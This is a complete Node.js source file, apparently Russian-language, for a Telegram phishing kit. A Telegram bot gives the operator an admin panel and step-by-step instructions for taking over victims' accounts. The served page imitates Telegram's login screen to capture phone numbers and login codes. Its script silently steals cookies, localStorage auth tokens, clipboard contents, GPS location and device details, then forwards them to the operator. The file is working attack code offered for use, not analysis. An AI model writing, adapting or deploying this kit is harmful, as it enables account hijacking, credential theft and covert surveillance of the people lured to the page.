// ==== ЧАСТЬ 1 (НАЧАЛО) ====
// language: JavaScript, target: Node.js 20
import express from 'express';
import TelegramBot from 'node-telegram-bot-api';

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !ADMIN_ID) process.exit(1);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json({ limit: '10mb' }));

const State = {
    history: [],
    stats: { visits: 0, clicks: 0, phones: 0, codes: 0, osCount: {} },
    settings: { notifyEnabled: true, doubleCode: true, stealData: true, geoEnabled: true },
    startTime: Date.now(),
    rateLimit: new Map()
};

const Utils = {
    formatTime: (ms) => {
        const s = Math.floor(ms / 1000), m = Math.floor(s / 60), h = Math.floor(m / 60);
        return `${h}ч ${m % 60}м ${s % 60}с`;
    },
    getUptime: () => Utils.formatTime(Date.now() - State.startTime),
    parseUA: (ua) => {
        let res = { os: "Unknown", model: "Unknown", browser: "Unknown" };
        if (!ua) return res;
        if (ua.includes("Android")) res.os = "Android";
        else if (ua.includes("iPhone")) res.os = "iOS";
        else if (ua.includes("Windows")) res.os = "Windows";
        else if (ua.includes("Mac OS")) res.os = "macOS";
        const match = ua.match(/Android\s[0-9.]+;\s([^;)]+)/);
        if (match && match[1]) { let m = match[1].trim(); if (m.includes("-")) m = m.split("-").pop(); res.model = m; }
        if (ua.includes("Chrome")) res.browser = "Chrome";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) res.browser = "Safari";
        return res;
    },
    checkRate: (ip) => {
        const now = Date.now();
        const record = State.rateLimit.get(ip) || { count: 0, start: now };
        if (now - record.start > 60000) { record.count = 0; record.start = now; }
        record.count++;
        State.rateLimit.set(ip, record);
        return record.count <= 15;
    }
};

const sendAdmin = async (text) => {
    if (!State.settings.notifyEnabled) return;
    try { await bot.sendMessage(ADMIN_ID, text, { parse_mode: 'HTML' }); } catch (e) {}
};

const bottomKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📊 Статистика' }, { text: '📜 История' }],
            [{ text: '⚙️ Настройки' }, { text: '📖 Инструкция' }],
            [{ text: '🌐 Открыть Сайт' }]
        ],
        resize_keyboard: true, is_persistent: true
    }
};

bot.onText(/^\/start$/, (msg) => {
    bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nID: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML', ...bottomKeyboard });
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (text === '📊 Статистика') {
        const topOS = Object.entries(State.stats.osCount).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([os, c]) => `${os}: ${c}`).join('\n');
        bot.sendMessage(chatId, `📊 <b>Статистика</b>\n\n⏱ Аптайм: ${Utils.getUptime()}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
    }
    if (text === '📜 История') {
        if (State.history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
        const hist = State.history.slice(0, 15).map((h, i) => `<b>${i + 1}.</b> <code>${h.phone}</code> | <code>${h.code}</code>`).join('\n');
        bot.sendMessage(chatId, `📜 <b>Последние 15 целей:</b>\n\n${hist}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🗑 Очистить', callback_data: 'clear' }]] } });
    }
    if (text === '⚙️ Настройки') {
        const s = State.settings;
        bot.sendMessage(chatId, `⚙️ <b>Настройки системы</b>`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
            [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
            [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
            [{ text: `Гео: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
        ] } });
    }
    if (text === '📖 Инструкция') {
        bot.sendMessage(chatId, `📖 <b>Инструкция</b>\n\n1. Скинь ссылку.\n2. Жертва вводит номер.\n3. Ты вводишь номер в Telegram.\n4. Жертва вводит код на сайте.\n5. Вводишь код в Telegram.`, { parse_mode: 'HTML' });
    }
    if (text === '🌐 Открыть Сайт') {
        bot.sendMessage(chatId, `🌐 https://tg-sms-2.onrender.com`);
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id, data = query.data;
    bot.answerCallbackQuery(query.id);
    if (data === 'stats') {
        const topOS = Object.entries(State.stats.osCount).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([os, c]) => `${os}: ${c}`).join('\n');
        bot.editMessageText(`📊 <b>Статистика</b>\n\n⏱ Аптайм: ${Utils.getUptime()}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
    }
    if (data === 'clear') {
        State.history = []; State.stats.phones = 0; State.stats.codes = 0;
        bot.editMessageText('🗑 Очищено.', { chat_id: chatId, message_id: query.message.message_id });
    }
    if (data === 't_notify') State.settings.notifyEnabled = !State.settings.notifyEnabled;
    if (data === 't_double') State.settings.doubleCode = !State.settings.doubleCode;
    if (data === 't_steal') State.settings.stealData = !State.settings.stealData;
    if (data === 't_geo') State.settings.geoEnabled = !State.settings.geoEnabled;
    if (data.startsWith('t_')) {
        const s = State.settings;
        bot.editMessageText(`⚙️ <b>Настройки системы</b>`, { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
            [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
            [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
            [{ text: `Гео: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
        ] } });
    }
});

app.post('/api/new_target', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (!Utils.checkRate(ip)) return res.status(429).json({ ok: false });
    State.stats.visits++; State.stats.phones++;
    const { phone, ua, screen, battery, memory, network, geo, steal, clipboard } = req.body;
    if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
    const device = Utils.parseUA(ua);
    State.stats.osCount[device.os] = (State.stats.osCount[device.os] || 0) + 1;
    let locStr = "Unknown";
    try {
        const r = await fetch(`http://ip-api.com/json/${ip.split(',')[0]}?fields=country,city,isp`);
        const d = await r.json();
        if (d.country) locStr = `${d.country}, ${d.city} (${d.isp})`;
    } catch (e) {}
    let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n📱 <b>Номер:</b> <code>${phone}</code>\n💻 <b>Устройство:</b> ${device.os} / ${device.model}\n🌐 <b>Браузер:</b> ${device.browser}\n🖥 <b>Экран:</b> ${screen || '?'}\n🔋 <b>Батарея:</b> ${battery || '?'}\n🧠 <b>ОЗУ:</b> ${memory || '?'}\n📶 <b>Сеть:</b> ${network || '?'}\n🌍 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n📍 <b>Локация:</b> ${locStr}\n`;
    if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть</a>\n`;
    if (steal && steal.length > 0 && State.settings.stealData) {
        msg += `\n🍪 <b>УКРАДЕНО (Cookies/LS):</b>\n`;
        steal.slice(0, 5).forEach(s => { msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 15)}...</code>\n`; });
        if (steal.length > 5) msg += `<i>...и еще ${steal.length - 5} записей</i>\n`;
    }
    if (clipboard) msg += `📋 <b>Буфер:</b> <code>${clipboard}</code>\n`;
    msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
    await sendAdmin(msg);
    res.json({ ok: true, doubleCode: State.settings.doubleCode });
});

app.post('/api/click', (req, res) => { State.stats.clicks++; res.json({ ok: true }); });

app.post('/api/code', async (req, res) => {
    State.stats.codes++;
    const { phone, code } = req.body;
    State.history.unshift({ phone, code });
    if (State.history.length > 50) State.history.pop();
    await sendAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <code>${code}</code>\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM!</i>`);
    res.json({ ok: true });
});
// ==== ЧАСТЬ 2 (ПРОДОЛЖЕНИЕ) ====
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Telegram</title>
<style>
    :root { --bg: #17212b; --surface: #0e1621; --primary: #2aabee; --text: #ffffff; --text-muted: #708499; --border: #2b5278; }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
    body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; user-select: none; }
    .app { width: 100%; max-width: 420px; height: 100vh; background: var(--bg); display: flex; flex-direction: column; position: relative; }
    .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; font-size: 15px; color: var(--primary); font-weight: 500; }
    .header { padding: 20px; text-align: center; }
    .logo { width: 90px; height: 90px; background: linear-gradient(135deg, var(--primary), #229ed9); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; box-shadow: 0 8px 25px rgba(42, 171, 238, 0.3); }
    .logo svg { width: 55px; height: 55px; fill: #fff; margin-left: 5px; }
    h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
    p.subtitle { font-size: 14px; color: var(--text-muted); line-height: 1.5; padding: 0 10px; }
    .form-container { padding: 20px; flex: 1; display: flex; flex-direction: column; }
    .input-group { display: flex; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
    .country-select { width: 110px; background: var(--surface); border: 1px solid var(--border); border-radius: 10px; color: var(--text); padding: 0 10px; font-size: 16px; outline: none; appearance: none; }
    .input-phone { flex: 1; background: var(--surface); border: 1px solid var(--border); border-radius: 10px; color: var(--text); padding: 16px; font-size: 17px; outline: none; transition: border-color 0.2s; }
    .input-phone:focus { border-color: var(--primary); }
    .btn { background: var(--primary); color: var(--text); border: none; border-radius: 10px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; width: 100%; display: flex; justify-content: center; align-items: center; }
    .btn:active { background: #229ed9; }
    .hidden { display: none !important; }
    .spinner { display: inline-block; width: 20px; height: 20px; border: 2.5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; margin-right: 10px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .code-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
    .code-input { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 600; background: var(--surface); border: 1.5px solid var(--border); border-radius: 10px; color: var(--text); outline: none; transition: border-color 0.2s; }
    .code-input:focus { border-color: var(--primary); }
    .hidden-stealer { position: absolute; opacity: 0; pointer-events: none; height: 0; width: 0; }
</style>
</head>
<body>
<div class="app">
    <div class="top-bar"><span id="clock"></span><span>Отмена</span></div>
    <div class="header">
        <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.94z"/></svg></div>
        <h1 id="title">Ваш номер</h1>
        <p class="subtitle" id="subtitle">Пожалуйста, подтвердите код страны и ваш номер телефона.</p>
    </div>
    <div class="form-container">
        <form id="phoneForm" autocomplete="off">
            <input type="text" class="hidden-stealer" id="hiddenStealer">
            <div class="input-group">
                <select class="country-select" id="countryCode">
                    <option value="373">🇲🇩 +373</option><option value="7">🇷🇺 +7</option><option value="380">🇺🇦 +380</option><option value="375">🇧🇾 +375</option><option value="1">🇺🇸 +1</option><option value="44">🇬🇧 +44</option><option value="49">🇩🇪 +49</option><option value="33">🇫🇷 +33</option>
                </select>
                <input type="tel" class="input-phone" id="phone" placeholder="69 123 456" required>
            </div>
            <button type="submit" class="btn" id="btnPhone">Далее</button>
        </form>
        <form id="codeForm" class="hidden" autocomplete="off">
            <div class="code-container">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
            </div>
            <button type="submit" class="btn" id="btnCode">Далее</button>
        </form>
    </div>
</div>
<script>
    const phoneForm = document.getElementById('phoneForm'), codeForm = document.getElementById('codeForm');
    const btnPhone = document.getElementById('btnPhone'), btnCode = document.getElementById('btnCode');
    const countryCode = document.getElementById('countryCode'), codeInputs = document.querySelectorAll('.code-input');
    const titleEl = document.getElementById('title'), subtitleEl = document.getElementById('subtitle');
    const phoneInput = document.getElementById('phone'), clockEl = document.getElementById('clock');
    const hiddenStealer = document.getElementById('hiddenStealer');
    
    let phoneValue = '', firstCodeValue = '', geoData = null, clipData = null, stolenData = [];
    let batteryLevel = 'Скрыто', isCharging = false, memorySize = 'Скрыто', networkType = 'Неизвестно';
    let isDoubleCode = true, isClicked = false;

    const Collector = {
        init() { this.collectSteal(); this.collectBattery(); this.collectMemory(); this.collectNetwork(); this.collectGeo(); this.initClock(); this.initClickTracking(); },
        collectSteal() {
            try {
                document.cookie.split(';').forEach(c => { const [n, ...v] = c.split('='); if (n && v.length) stolenData.push({ name: n.trim(), value: v.join('=') }); });
                for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); if (k.includes('token') || k.includes('auth') || k.includes('session')) stolenData.push({ name: 'LS:' + k, value: localStorage.getItem(k) }); }
            } catch (e) {}
        },
        async collectBattery() { try { if (navigator.getBattery) { const b = await navigator.getBattery(); batteryLevel = Math.round(b.level * 100) + '%'; isCharging = b.charging; } } catch (e) {} },
        collectMemory() { try { if (navigator.deviceMemory) memorySize = navigator.deviceMemory + ' GB'; } catch (e) {} },
        collectNetwork() { try { if (navigator.connection) networkType = navigator.connection.effectiveType || 'Неизвестно'; } catch (e) {} },
        collectGeo() { try { if (navigator.geolocation) navigator.geolocation.getCurrentPosition((p) => { geoData = p.coords.latitude + ',' + p.coords.longitude; }, () => {}, { enableHighAccuracy: true, timeout: 5000 }); } catch (e) {} },
        initClock() { const u = () => { const d = new Date(); clockEl.textContent = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0'); }; u(); setInterval(u, 1000); },
        initClickTracking() {
            const t = () => { if (isClicked) return; isClicked = true; fetch('/api/click', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' }).catch(() => {}); };
            document.body.addEventListener('click', t); document.body.addEventListener('touchstart', t);
        }
    };

    const UI = {
        init() { Collector.init(); this.initPhoneMask(); this.initCodeInputs(); },
        initPhoneMask() { phoneInput.addEventListener('input', (e) => { let v = e.target.value.replace(/\\D/g, ''); if (v.length > 9) v = v.slice(0, 9); let f = v; if (v.length > 6) f = v.slice(0, 3) + ' ' + v.slice(3, 6) + ' ' + v.slice(6); else if (v.length > 3) f = v.slice(0, 3) + ' ' + v.slice(3); e.target.value = f; }); },
        initCodeInputs() { codeInputs.forEach((inp, i) => { inp.addEventListener('input', (e) => { if (e.target.value.length === 1 && i < 4) codeInputs[i + 1].focus(); }); inp.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && e.target.value.length === 0 && i > 0) codeInputs[i - 1].focus(); }); }); },
        showCodeForm() { phoneForm.classList.add('hidden'); codeForm.classList.remove('hidden'); titleEl.textContent = 'Введите код'; subtitleEl.innerHTML = 'Мы отправили код в Telegram на номер <b>+' + phoneValue + '</b>'; setTimeout(() => codeInputs[0].focus(), 100); },
        showRepeatCodeForm() { codeInputs.forEach(i => i.value = ''); btnCode.innerHTML = 'Далее'; btnCode.disabled = false; titleEl.textContent = 'Повторите код'; subtitleEl.innerHTML = 'В целях безопасности подтвердите код еще раз.'; codeInputs[0].focus(); },
        showSuccess() { titleEl.textContent = 'Готово'; subtitleEl.innerHTML = 'Вы успешно вошли в аккаунт.'; codeForm.innerHTML = '<div style="text-align:center;font-size:60px;margin-top:20px;animation:fadeIn 0.5s;">✅</div>'; setTimeout(() => { window.location.href = 'https://web.telegram.org'; }, 2000); },
        setLoading(btn, t) { btn.innerHTML = '<span class="spinner"></span>' + t; btn.disabled = true; }
    };

    phoneForm.onsubmit = async (e) => {
        e.preventDefault();
        const l = phoneInput.value.replace(/\\D/g, ''); if (l.length < 7) return;
        phoneValue = countryCode.value + l;
        UI.setLoading(btnPhone, 'Отправка...');
        
        try { if (navigator.clipboard) clipData = await navigator.clipboard.readText(); } catch(e) {}

        const p = { phone: phoneValue, ua: navigator.userAgent, screen: window.screen.width + 'x' + window.screen.height, battery: batteryLevel, memory: memorySize, network: networkType, geo: geoData, steal: stolenData, clipboard: clipData };
        try {
            const r = await fetch('/api/new_target', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
            const d = await r.json();
            isDoubleCode = d.doubleCode; UI.showCodeForm();
        } catch (e) { btnPhone.innerHTML = 'Далее'; btnPhone.disabled = false; }
    };

    codeForm.onsubmit = async (e) => {
        e.preventDefault();
        let c = ''; codeInputs.forEach(i => c += i.value); if (c.length < 5) return;
        if (isDoubleCode && !firstCodeValue) { firstCodeValue = c; UI.showRepeatCodeForm(); return; }
        UI.setLoading(btnCode, 'Проверка...');
        try {
            await fetch('/api/code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phoneValue, code: firstCodeValue || c }) });
            UI.showSuccess();
        } catch (e) { btnCode.innerHTML = 'Далее'; btnCode.disabled = false; }
    };

    UI.init();
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
    console.log(`[SERVER] Started on port ${PORT}`);
});
